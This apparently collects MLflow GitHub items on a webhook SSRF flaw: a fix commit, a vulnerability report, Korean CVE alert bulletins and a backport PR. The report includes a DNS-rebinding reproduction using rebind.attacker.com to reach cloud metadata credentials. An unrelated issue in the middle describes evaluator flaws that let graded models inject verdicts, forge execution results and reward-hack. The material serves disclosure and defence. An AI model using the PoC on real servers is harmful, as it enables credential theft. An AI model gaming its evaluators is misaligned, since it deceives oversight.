message:
Fix DNS-rebinding SSRF bypass in webhook delivery

_validate_webhook_url resolves the webhook hostname and checks each IP is
public, but discards the resolved IP; the subsequent requests.post re-resolves
the hostname independently. A DNS-rebinding attacker can return a public IP at
validation time and a private/link-local IP (e.g. 169.254.169.254) at request
time, reaching cloud metadata or internal services.

Close the TOCTOU gap by validating the peer IP of the actual connected socket
immediately after connect, before any TLS handshake or HTTP data, via an
SSRF-protected HTTPAdapter scoped to the webhook delivery session. TLS still
runs against the original hostname, so certificate validation is unaffected.
The MLFLOW_WEBHOOK_ALLOW_PRIVATE_IPS escape hatch is honored at connect time.

Co-Authored-By: Claude <noreply@anthropic.com>
Signed-off-by: Pat Sukprasert <pattara.sk127@gmail.com>

## Pull request overview

This PR hardens MLflow’s outbound webhook delivery against DNS-rebinding SSRF by moving IP validation from URL-validation time to connection time, ensuring the connected peer’s IP is public before any HTTP/TLS data is sent.

**Changes:**
- Adds a webhook-scoped `SSRFProtectedHTTPAdapter` that validates the connected socket’s peer IP immediately after TCP connect.
- Mounts the SSRF-protected adapter on the webhook delivery `requests.Session` for both HTTP and HTTPS.
- Introduces new tests covering DNS-rebinding and private-IP blocking/allowlisting behavior.

### Reviewed changes

Copilot reviewed 3 out of 3 changed files in this pull request and generated 2 comments.

| File | Description |

| `mlflow/webhooks/ssrf.py` | Implements connection-time peer-IP validation via custom urllib3 connection/pool classes and a `requests` adapter. |
| `mlflow/webhooks/delivery.py` | Uses the SSRF-protected adapter for webhook delivery sessions. |
| `tests/webhooks/test_ssrf.py` | Adds regression tests for DNS-rebinding and private-IP connection blocking/allowlisting. |

Address Copilot review: disable env proxy handling for webhook session

Copilot flagged that with trust_env at its default, an HTTP(S)_PROXY env var
routes webhook requests through the proxy, making the validated peer the proxy
rather than the destination and bypassing the SSRF check entirely. Set
trust_env=False on the webhook session so the peer check always runs against
the real destination, and add a regression test.

Also switch the no-retry test from GET to POST so it exercises the production
retry config (allowed_methods=["POST"]).

# DNS rebinding bypass of webhook SSRF protection enables cloud metadata access

## Summary

MLflow's webhook SSRF protection validates the webhook URL hostname by resolving
it via DNS (`socket.getaddrinfo`) and checking each resolved IP is public
(`ip.is_global`). However, the validation **discards the resolved IP** (the
function returns `None` on success), and the subsequent HTTP request
(`requests.post(webhook.url)`) **re-resolves the hostname independently**.

A DNS rebinding attack defeats this: an attacker-controlled DNS server returns a
public IP during validation (passes the `is_global` check) and returns a private
or link-local IP (`169.254.169.254`, `127.0.0.1`) during the actual request.
This enables SSRF to cloud instance metadata endpoints, leaking IAM credentials
and cloud secrets.

MLflow already has DNS-rebinding protection for the **inbound** OTLP path
(`TrustedHostMiddleware` / Host-header validation, see #22095). This issue
reports that the **outbound** webhook path does not have equivalent protection
— it relies on `getaddrinfo` + IP-check, which is bypassable via rebinding.

## The vulnerability

### Validation discards the resolved IP

```python
# mlflow/utils/validation.py:889-936
def _validate_webhook_url(url: str) -> None:          # ← returns None
    ...
    hostname = parsed_url.hostname
    ...
    if not _MLFLOW_WEBHOOK_ALLOW_PRIVATE_IPS.get():
        addr_infos = socket.getaddrinfo(hostname, None)   # ← resolves hostname
        ...
        for addr_info in addr_infos:
            ip = ipaddress.ip_address(addr_info[4][0])
            if not ip.is_global:                            # ← checks IP is public
                raise MlflowException(...)                  # ← raises on private IP
                                                            # ← but returns None on success
                                                            #   (IP is discarded)
```

### The request re-resolves the hostname

```python
# mlflow/webhooks/delivery.py:153,189
def _send_webhook_request(webhook, payload, event, session):
    _validate_webhook_url(webhook.url)                    # ← resolves + validates + DISCARDS
    ...
    return session.post(webhook.url, data=payload_bytes, ...)  # ← re-resolves webhook.url
```

`session.post(webhook.url)` passes the **hostname** to `requests`, which calls
`urllib3` → `socket.getaddrinfo(hostname)` again. The second resolution is
independent of the first and can return a different IP.

### The DNS rebinding attack

```
Timeline:
1. Attacker creates webhook with URL = http://rebind.attacker.com/catch
2. DNS for rebind.attacker.com → 1.2.3.4 (attacker's public IP)
3. Model event fires → deliver_webhook() called
4. _validate_webhook_url("http://rebind.attacker.com/catch"):
     getaddrinfo("rebind.attacker.com") → 1.2.3.4
     ipaddress.IPv4Address('1.2.3.4').is_global → True
     validation PASSES (returns None, IP discarded)
5. session.post("http://rebind.attacker.com/catch"):
     DNS server now returns 169.254.169.254 (AWS metadata)
     requests connects to 169.254.169.254
     POST /catch → 200 (metadata endpoint responds)
     attacker receives IAM credentials in the response
```

### Why validation timing doesn't help

`_validate_webhook_url` is called at both creation
(`sqlalchemy_store.py:1612`) and delivery (`delivery.py:153`). But at delivery
time, the same TOCTOU gap exists: validation resolves and discards, then the
request re-resolves. Rebinding works on every delivery, not just creation.

## Reproduction

This requires a DNS rebinding setup (e.g., `rebind.it` or a custom DNS server
that alternates between a public and private IP on successive queries). The
MLflow-side reproduction:

```python
# 1. Create a webhook pointing to a rebinding domain
import mlflow
from mlflow.tracking import MlflowClient

client = MlflowClient()
client.create_webhook(
    name="ssrf-poc",
    url="http://rebind.attacker.com/catch",  # DNS returns public IP first,
                                              # 169.254.169.254 second
    events=["registered_model.created"],
)

# 2. Trigger a model registry event
client.create_registered_model("trigger-model")

# 3. The webhook fires:
#    - _validate_webhook_url resolves rebind.attacker.com → public IP → passes
#    - session.post resolves rebind.attacker.com → 169.254.169.254 → SSRF
#    - POST to cloud metadata → IAM credentials leaked to attacker
```

## Auth model

The `_create_webhook` handler (`handlers.py:3367`) has `@catch_mlflow_exception`
and `@_disable_if_artifacts_only` but **no permission decorator**. Any
authenticated MLflow user can create webhooks with arbitrary URLs. In a
multi-tenant deployment, a low-privilege user can trigger SSRF on any model
registry event.

## Impact

- **SSRF to cloud metadata** (`169.254.169.254`): leaks IAM role credentials,
  temporary tokens, and instance metadata. On AWS, `GET
  http://169.254.169.254/latest/meta-data/iam/security-credentials/` returns
  access keys that grant access to whatever the MLflow server's IAM role allows.
- **SSRF to internal services**: `127.0.0.1`, `10.x.x.x`, `192.168.x.x` services
  that are not publicly exposed (admin panels, databases, internal APIs).
- **Severity**: Critical — cloud credential theft from a deployed ML
  infrastructure tool. Requires authenticated MLflow access (not anonymous), but
  no admin privilege.

## Suggested fix

Validate the IP at **connection time** (after the socket connects, before the
request is sent), rather than at validation time. This closes the TOCTOU gap
because there is no second DNS resolution between the check and the request:

```python
import ipaddress
from urllib3.util.connection import create_connection as _orig_create_connection


def _validated_create_connection(address, *args, **kwargs):
    """Validate the peer IP after connect, before any data is sent."""
    sock = _orig_create_connection(address, *args, **kwargs)
    peer_ip = sock.getpeername()[0]
    if not ipaddress.ip_address(peer_ip).is_global:
        sock.close()
        raise ValueError(f"SSRF blocked: {peer_ip} is not a public IP")
    return sock


# Apply to the webhook session via a custom HTTPAdapter or by patching
# urllib3's connection pool for the webhook delivery session only.
# This works for both HTTP and HTTPS: the TLS handshake uses the original
# hostname (certificate validation is unaffected), and the socket-level
# IP check runs before any HTTP data is sent.
```

urllib3 >= 2.0 (MLflow pins `urllib3>=2.0`) also supports pool-level host
validation via the `allowed_hosts` parameter on `Retry`, which achieves the
same effect without monkeypatching.

**Note on the IP-replacement approach:** replacing the hostname with a pinned IP
in the request URL would also close the gap, but it breaks HTTPS because the TLS
certificate is issued for the hostname, not the pinned IP. The socket-level
approach above avoids this.

**Note on DNS caching:** DNS rebinding requires the resolver to honor a near-zero
TTL so the second resolution is a fresh query. This works on most cloud instances
(remote resolvers, `systemd-resolved` in stub mode) but can be mitigated by
caching resolvers that enforce a minimum TTL (e.g., `dnsmasq --local-ttl`). This
is a well-known characteristic of the attack class. The socket-level fix above is
robust regardless of caching behavior because it validates the IP of the
**actual connected socket**, not a cached DNS result.

## Relationship to existing protections

- **#20747** (merged): Added `_validate_webhook_url` with `getaddrinfo` + IP
  check. This is the fix that introduced the validation — but it has the TOCTOU
  gap described above.
- **#22095** (closed): DNS rebinding protection for the **inbound** OTLP path
  via `TrustedHostMiddleware` (Host-header validation). This protection exists
  for inbound requests but was **never applied to outbound webhook delivery**.

## Environment

- `mlflow` commit: `df0bcff` (main, 2026-06-26)
- `_MLFLOW_WEBHOOK_ALLOW_PRIVATE_IPS` defaults to `False` (private IPs blocked)
- `_MLFLOW_WEBHOOK_ALLOWED_SCHEMES` defaults to `["https"]`

issue.body:
## Summary Propose adding three case studies documenting a single unified defect class — the **Evaluator Trust Boundary (ETB)** failure — observed across 76 instances in 36 organizations' production AI evaluation, guardrail, and training infrastructure. The supporting research, including a deterministic detector and a training result showing base exploitation rises with model scale, is at https://doi.org/10.5281/zenodo.21633620 (full class definitions and fix patterns at https://www.authensor.com/etb). Each case study carries a proposed new technique **inline** (per the `case_study.procedure.technique` path in `atlas_contribution_schema.json`), because ETB describes compromise of AI measurement infrastructure — a surface ATLAS does not currently cover: of the 173 techniques in v2026.06, none describes a defect in the scoring/evaluation code path itself. The closest existing technique, `AML.T0067` (LLM Trusted Output Components Manipulation), targets components of the model's rendered output as presented to a user; ETB targets the code that parses the verdict out of text the evaluated system authored. ## Why this is a class, not three bugs The one-line framing: **a score must be a function only of state the evaluated system cannot reach.** The candidate's answer may be the *object* of the judgement, but it may not be an *input* to it. Each of the ten ETB mechanisms is a different way those two collapse. A fix for one does not fix the others, but a design discipline that asks "what does this scorer read that the policy can write?" catches all ten. This is demonstrated empirically (paper §4.1): the same frontier judge (Kimi K3) scored 0.0000 ASR when the verdict was read from a position the candidate could not write to, and 1.0000 ASR when the verdict was read by greedy first-match over a candidate-containing blob — with prompt, model, and instruction held fixed. The model was never the problem; the parse was. ## Relation to the LLM-judge-attack literature (paper §7.1) ETB is distinct from JudgeDeceiver, BadJudge, Maloyan et al., and Roth et al. (2026). Those are attack papers requiring an adversary with specific capabilities (gradient access for GCG suffixes; write access to the evaluator's training data). ETB requires **no adversary** — it fires on benign prose containing a verdict token, and on policies that drift into the pattern under optimization pressure. The prior work's locus is the **judge model**; ETB's locus is the **scoring code path**. The prior work measures attack success on benchmarks; this submission reports **prevalence in deployed production code across 36 organizations** (76 instances of the class; 99 defect reports total across 46 organizations). A perfectly hardened judge does not fix ETB-01 — the §4.1 experiment above is the proof. The Cloud Security Alliance's [ATLAS Agentic Gap Analysis (2026-03-27)](https://labs.cloudsecurityalliance.org/agentic/csa-research-note-atlas-agentic-gap-analysis-20260327/) independently names an adjacent gap — "Orchestrator Hijacking," defined as compromise of the component that assigns tasks and aggregates results, with "no precedent in ATT&CK" — which the third case study (ETB-09, forged execution artifact) fills directly. ## Case-study type note Though filed as `case-study-type: exercise` (authorized independent audit), the underlying evidence is a **field survey of production evaluation infrastructure** in 36 organizations including national safety institutes (UK AI Security Institute), frontier labs (OpenAI, NVIDIA, Meta, Microsoft), evaluation vendors and foundries (Patronus AI, Mercor, Prime Intellect, Gray Swan), and the open-source inference and agent stack (Hugging Face, EleutherAI, LiteLLM, vLLM, SGLang, LlamaIndex, CrewAI, Chroma) — not a synthetic red-team. `AML.CS0000` (Palo Alto malware-detector evasion) is the same exercise-type precedent. ## The three submissions All three are schema-valid against `dist/schemas/atlas_contribution_schema.json` (validated locally with jsonschema Draft-7). Each ships its novel technique inline; the impact step of ETB-09 also references the existing `AML.T0053` (AI Agent Tool Invocation). | # | Case study | Mechanism | Instances | Strongest evidence | |---|---|---|---|---| | 1 | **ETB-01 — Injected verdict trusted** | A score parsed out of candidate-written text | **24** | §4.1 K3 demonstration; convergent greedy-first-match idiom across independent codebases | | 2 | **ETB-04 / ETB-05 — Denominator drop / Unscorable read as absent** | A mean over a silently reduced sample; "could not score" read as "safe" | 6 + 10 | Carries the §5 training-hazard result (TRL SDPO reward-hacking gradient; base exploitation 11.3%→50.0%→45.0% across Qwen2.5 0.5B/1.5B/7B) | | 3 | **ETB-09 — Forged execution artifact** | A self-reported execution result trusted over the ground truth of execution | 7 | Fills CSA's "Orchestrator Hijacking" gap; SWE-bench / HumanEval / EvalPlus / OpenCompass | The full JSON for each is embedded below in collapsible `
` sections, ready to load into the database via the existing `tools/populate_atlas_db.py` workflow. ## Evidence honesty Of the 76 ETB instances, the audit counts **16 fixes as landed** across all 99 reports (12 ETB-class; paper §6). Each reference in the three submissions is labeled with its actual outcome — `[LANDED]`, `[FILED, open]`, or `[FILED, closed unmerged]` — so no reader is misled into believing all cited reports have landed. The two Hugging Face TRL reports (#6426 SDPO, #6427 OpenReward) are closed-unmerged and are cited as evidence the defect exists in RL training infrastructure, **not** as landed fixes; the training-hazard claim rests on the paper's controlled dual-track experiment (§5), not on whether those PRs merged. # 🛡️ MLflow: 웹훅 전달 시 인증되지 않은 전체 읽기 SSRF (HTTP 리다이렉트 및 DNS 리바인딩을 통한 우회) > **탐지 일시:** 2026-08-18 06:47:59 (KST) > **탐지 사유:** 🆕 신규 Critical 취약점 > **⚡ 대응 우선순위: 🟠 높음** — CVSS Critical (악용 신호는 아직 미확인) ![CVSS](https://img.shields.io/badge/CVSS-9.3-FF0000) ![EPSS](https://img.shields.io/badge/EPSS-0.00%25-blue) ![KEV](https://img.shields.io/badge/KEV-No-CCCCCC) EPSS 0.00% — 향후 30일 내 실제 악용 시도 확률 (출처: FIRST.org) **취약점 유형 (CWE):** CWE-918 ## 📄 취약점 개요 검증되지 않은 HTTP 리다이렉트로 인해 _validate_webhook_url 검증을 우회하여 내부 서비스나 클라우드 메타데이터 서비스에 접근할 수 있습니다.
원문 (English) > MLflow is an open source AI engineering platform for agents, large language models, and machine learning models. Prior to 3.15.0, the unauthenticated POST /api/2.0/mlflow/webhooks/{id}/test endpoint calls _validate_webhook_url() in mlflow/utils/validation.py only for the original URL while mlflow/webhooks/delivery.py follows redirects and re-resolves the hostname without pinning the validated address, allowing attackers to reach internal or cloud metadata services and receive response_status and response_body. This issue is fixed in version 3.15.0.
## 📦 영향 받는 자산 (벤더 / 제품 / 버전) | 벤더 | 제품 | 버전 | | :--- | :--- | :--- | | mlflow | mlflow | < 3.15.0 (단일 버전) | ## 🔍 AI 심층 분석 ### 기술적 근본 원인 MLflow의 unauthenticated POST /api/2.0/mlflow/webhooks/{id}/test 엔드포인트가 원본 URL에 대해서만 mlflow/utils/validation.py의 _validate_webhook_url()을 호출하고, 이후 리다이렉트를 따르거나 호스트명을 재해석할 때 검증된 주소를 고정(pinning)하지 않아 발생하는 CWE-918 (Server-Side Request Forgery, SSRF) 취약점이다. ### 🎯 공격 벡터 상세 | 항목 | 내용 | | :--- | :--- | | **공식 벡터** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N` | | **상세 해석** | • CVSS:3.1
• 공격 경로: 네트워크 (Network)
• 복잡성: 낮음
• 필요 권한: 없음
• 사용자 관여: 없음
• 범위: 변경됨 (Changed)
• 기밀성: 높음
• 무결성: 낮음
• 가용성: 없음 | ### 🏹 공격 시나리오 (MITRE ATT&CK) MITRE ATT&CK 기반 공격 흐름: **초기 접근(Initial Access)** – 공격자는 네트워크를 통해 인증 없이 취약한 엔드포인트에 접근하여 웹훅 테스트 요청을 보낸다 (T1190: Exploit Public-Facing Application). **실행(Execution)** – MLflow가 리다이렉트를 따르며 호스트명을 재해석하는 과정에서 검증된 주소가 고정되지 않아, 내부 네트워크 또는 클라우드 메타데이터 서비스로 요청이 전달된다 (T1210: Exploitation of Remote Services). [추정] **영향(Impact)** – 공격자가 내부 서비스에 도달하여 response_status와 response_body를 수신함으로써 내부 시스템 정보나 클라우드 메타데이터를 획득한다 (T1595: Active Scanning). [추정] ### 💥 비즈니스 영향 인증 없는 공격자가 서버 측 요청 위조(SSRF)를 통해 내부 시스템 또는 클라우드 메타데이터 서비스에 접근하여 응답 데이터를 수신할 수 있으며, 이로 인해 민감한 내부 정보 유출 및 인프라 구조 노출 등의 비즈니스적 보안 위협이 발생할 수 있다. issue.body:
# 🛡️ MLflow: 웹훅 전달 시 인증되지 않은 전체 읽기 SSRF 취약점 > **탐지 일시:** 2026-08-20 02:56:01 (KST) > **탐지 사유:** 🚨 KEV 등재 > **⚡ 대응 우선순위: 🔴 즉시 대응** — CISA KEV 등재 — 실제 악용 확인됨 ![CVSS](https://img.shields.io/badge/CVSS-9.3-FF0000) ![EPSS](https://img.shields.io/badge/EPSS-1.11%25-blue) ![KEV](https://img.shields.io/badge/KEV-YES-FF0000) EPSS 1.11% — 향후 30일 내 실제 악용 시도 확률 (출처: FIRST.org) **취약점 유형 (CWE):** CWE-918 ## 🧨 위협 신호 - **CISA SSVC** (vulnrichment, CC0): exploitation=none, automatable=yes, technical_impact=total - **PoC 공개** (출처: nomi-sec/trickest, 원문 미게시·링크만): 2건 — [PoC 링크](https://github.com/codeb0ssx/CVE-2026-64849-PoC) ## 📄 취약점 개요 검증되지 않은 HTTP 리다이렉트 및 DNS rebinding을 통해 내부 서비스나 클라우드 메타데이터에 접근 가능합니다.
원문 (English) > MLflow is an open source AI engineering platform for agents, large language models, and machine learning models. Prior to 3.15.0, the unauthenticated POST /api/2.0/mlflow/webhooks/{id}/test endpoint calls _validate_webhook_url() in mlflow/utils/validation.py only for the original URL while mlflow/webhooks/delivery.py follows redirects and re-resolves the hostname without pinning the validated address, allowing attackers to reach internal or cloud metadata services and receive response_status and response_body. This issue is fixed in version 3.15.0.
## 📦 영향 받는 자산 (벤더 / 제품 / 버전) | 벤더 | 제품 | 버전 | | :--- | :--- | :--- | | mlflow | mlflow | < 3.15.0 (단일 버전) | ## 🔍 AI 심층 분석 ### 기술적 근본 원인 MLflow의 인증되지 않은 POST /api/2.0/mlflow/webhooks/{id}/test 엔드포인트에서 원본 URL에 대해서만 _validate_webhook_url()을 호출하며, 이후 mlflow/webhooks/delivery.py가 리다이렉트를 따르고 검증된 주소를 고정(pinning)하지 않고 호스트 명을 다시 해결(re-resolves)하여 발생하는 CWE-918 (Server-Side Request Forgery) 취약점이다. ### 🎯 공격 벡터 상세 | 항목 | 내용 | | :--- | :--- | | **공식 벡터** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N` | | **상세 해석** | • CVSS:3.1
• 공격 경로: 네트워크 (Network)
• 복잡성: 낮음
• 필요 권한: 없음
• 사용자 관여: 없음
• 범위: 변경됨 (Changed)
• 기밀성: 높음
• 무결성: 낮음
• 가용성: 없음 | ### 🏹 공격 시나리오 (MITRE ATT&CK) MITRE ATT&CK 기반 공격 흐름: **초기 접근(Initial Access)** – 공격자는 인증 없이 취약한 POST /api/2.0/mlflow/webhooks/{id}/test 엔드포인트에 접근하여 요청을 보낸다 (T1190: Exploit Public-Facing Application). **발견(Discovery)** – [추정] 애플리케이션이 리다이렉트를 따르고 호스트 명을 다시 해결하는 과정을 악용하여 내부 네트워크 또는 클라우드 메타데이터 서비스의 존재와 정보를 탐색한다 (T1046: Network Service Discovery). **수집(Collection)** – [추정] SSRF 취약점을 통해 내부 서비스나 클라우드 메타데이터 서비스에 도달하여 응답 상태 및 본문(response_status, response_body)을 탈취한다 (T1530: Data from Cloud Storage Object / T1590: Gather Victim Network Information). ### 💥 비즈니스 영향 공격자가 내부 네트워크 서비스나 클라우드 메타데이터 서비스에 접근하여 민감한 정보(response_body 등)를 획득할 수 있으며, 기밀성(Confidentiality)에 심각한 피해를 줄 수 있고 무결성(Integrity) 일부에 영향을 미칠 수 있다. ## 🛡️ 권고 대응 방안 - 제조사인 MLflow의 버전 3.15.0 이상으로 업데이트 적용 - 공식 보안 자문 및 패치 적용 (참고: https://github.com/mlflow/mlflow/security/advisories/GHSA-7gwp-5pfp-969j) ## 🔗 참고 자료 - https://github.com/mlflow/mlflow/security/advisories/GHSA-7gwp-5pfp-969j - https://github.com/mlflow/mlflow/issues/24179 - https://github.com/mlflow/mlflow/pull/24258 - https://github.com/mlflow/mlflow/commit/ba949522477cbd5915aa55d29b0cfad7d5ddf939 - https://github.com/mlflow/mlflow/releases/tag/v3.15.0 - https://github.com/codeb0ssx/CVE-2026-64849-PoC (PoC, nomi-sec/trickest) - https://github.com/BiuTrap/CVE-2026-64849 (PoC, nomi-sec/trickest) --- 📊 **데이터 출처**: CVE(cvelistV5, CC0) · NVD(NIST, 공공) · CISA KEV·SSVC/vulnrichment(공공/CC0) · EPSS([FIRST.org](https://www.first.org/epss/)) · [OSV.dev](https://osv.dev)(CC-BY 4.0) · GitHub Advisory · Metasploit(Rapid7, BSD-3) · PoC/ExploitDB(원문 미게시·링크만). 공개 탐지 룰은 각 출처·라이선스 고지를 보존합니다. repository.description: The open source developer platform to build AI agents and models with confidence. Enhance your AI applications with end-to-end tracking, observability, and evaluations, all in one integrated platform.

issue.body:
## Summary

Backports the upstream fix for **CVE-2026-64849** (unvalidated-redirect / DNS-rebinding SSRF in webhook delivery) to `master`.

`_validate_webhook_url` validates only the original webhook URL; the subsequent request then follows HTTP redirects and re-resolves the hostname without pinning the validated IP. A DNS-rebinding or redirect can therefore reach internal or cloud-metadata endpoints, and the `POST /api/2.0/mlflow/webhooks/{id}/test` endpoint returns `response_status`/`response_body` to the caller (full-read SSRF).

This is a clean cherry-pick of upstream commit `ba9495224` (mlflow/mlflow#24258, released in v3.15.0), with authorship and `cherry picked from` provenance preserved. It adds `mlflow/webhooks/ssrf.py` (`SSRFProtectedHTTPAdapter`, which validates the connected peer IP is public at connect time, before TLS) and wires it into `_create_webhook_session()` with `session.trust_env = False`. No other behavior changes.

## Upstream / Downstream Impact

- [x] No upstream impact / not applicable

Already fixed upstream in mlflow/mlflow#24258 (v3.15.0); this PR only backports that commit.

## Testing

- [x] Unit tests

Testing details: the backported `tests/webhooks/test_ssrf.py` (8 tests) pass locally on this branch — DNS-rebinding-to-loopback blocked, private-IP blocked, env-proxy bypass blocked, explicit-proxy-to-private blocked, fail-closed on `getpeername` OSError, SSRF error not retried, and the allow-private-IPs override.
